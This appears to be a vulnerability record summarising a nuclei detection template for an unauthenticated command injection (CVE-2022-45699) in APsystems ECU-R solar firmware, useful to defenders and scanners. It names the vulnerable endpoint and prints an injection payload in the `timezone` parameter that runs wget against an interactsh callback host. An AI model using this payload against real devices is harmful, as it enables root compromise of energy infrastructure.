---
cve_id: CVE-2022-45699
template_path: nuclei-templates/http/cves/2022/CVE-2022-45699.yaml
affected_product: APsystems ECU-R Firmware
severity: critical
authentication: none
external_callback: true
affected_versions: 5203
preconditions: []
poc_classification: rce
---

## Vulnerability
Command injection in the administration interface of APsystems ECU-R Firmware version 5203 allows a remote unauthenticated attacker to execute arbitrary commands as root using the `timezone` parameter sent via POST to `/index.php/management/set_timezone`.  
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8).  
CWE-78, CWE-94.  
Full root-level compromise of the solar power management system and any connected infrastructure is possible.

## PoC / Detection
Classification: rce  
The template first issues a GET request to `/` and internally matches the page title `<title>Altenergy Power Control Software` to fingerprint the product. It then sends a crafted POST request containing `timezone=;wget+{{interactsh-url}};#` and confirms exploitation when the server returns HTTP 200 and an out-of-band HTTP callback is received at the interactsh listener, proving the injected command executed.

## References
- https://github.com/0xst4n/APSystems-ECU-R-RCE-Timezone
